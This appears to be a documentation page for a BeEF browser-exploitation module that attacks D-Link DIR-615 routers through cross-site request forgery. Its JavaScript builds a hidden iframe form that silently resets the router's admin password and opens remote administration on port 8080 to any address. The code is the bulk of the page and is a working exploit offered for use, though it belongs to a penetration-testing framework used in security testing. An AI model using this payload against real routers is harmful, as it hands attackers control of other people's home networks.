## Summary

* **Objective**: enable remote administration and change the admin password on a D-Link DIR-615 router
* **Authors**: antisnatchor, n0x00
* **Browsers**: All

* [Code](https://github.com/beefproject/beef/tree/master/modules/exploits/router/dlink_dir_615_csrf)

## Internal Working

uses iframes with a POST form to enable remote administration on port 8080 and change the admin password on a D-Link DIR-615 router

```js

  var gateway = '<%= @base %>';
  var passwd  = '<%= @password %>';
  var timeout = 15;

  var dir615_iframe_<%= @command_id %> = beef.dom.createIframeXsrfForm(gateway + "tools_admin.php", "POST", "application/x-www-form-urlencoded",
      [{'type':'hidden', 'name':'ACTION_POST',     'value':'1'} ,
       {'type':'hidden', 'name':'apply',           'value':'Save Settings'},
       {'type':'hidden', 'name':'admin_name',      'value':'admin'},
       {'type':'hidden', 'name':'admin_password1', 'value':passwd},
       {'type':'hidden', 'name':'admin_password2', 'value':passwd},
       {'type':'hidden', 'name':'rt_enable',       'value':'on'},
       {'type':'hidden', 'name':'rt_enable_h',     'value':'1'},
       {'type':'hidden', 'name':'rt_ipaddr',       'value':'0.0.0.0'},
       {'type':'hidden', 'name':'rt_port',         'value':'8080'}
      ]);

  
```

## Feedback

